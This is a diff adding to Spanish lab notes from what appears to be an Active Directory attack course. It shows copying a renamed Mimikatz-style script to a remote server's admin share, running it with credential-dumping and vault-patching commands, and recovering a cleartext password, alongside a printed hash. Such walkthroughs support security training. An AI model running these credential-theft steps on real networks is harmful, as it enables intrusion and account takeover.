@@ -633,6 +633,7 @@ Invoke-TheKat -Command $Pwn
 
 Ahora nos transferiremos el archivo a la maquina de *dcorp-adminsrv*
 ```shell
+[student97]
 Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
 
@@ -654,5 +655,16 @@ appadmin -> 68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb
 EL uso del $ detras de un nombre de usuario, quiere decir que es una cuenta de equipo
 ```
 
-También se pueden buscar las credenciales usando 
+También se pueden buscar las credenciales usando El mismo *Invoke-TheKat* pero en vez de hacer la modificacion anterior deberemos de reemplazar *Invoke-TheKat -Command '"sekurlsa::ekeys"'* por *nvoke-Mimi -Command '"token::evasive-elevate" "vault::cred /patch"'* , lo transferimos de nuevo a la maquina de *dcorp-adminsrv* 
+```shell
+[student97]
+ Copy-Item C:\AD\Tools\Invoke-TheKatEx-vault-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+```
 
+Y despues lo ejecutaremows
+```shell
+[dcopr-adminsrv]
+.\Invoke-TheKatEx-vault-std97.ps1
+```
+
+Encontrando las credenciales en texto claro del usuario *dcorp-srvadmin*
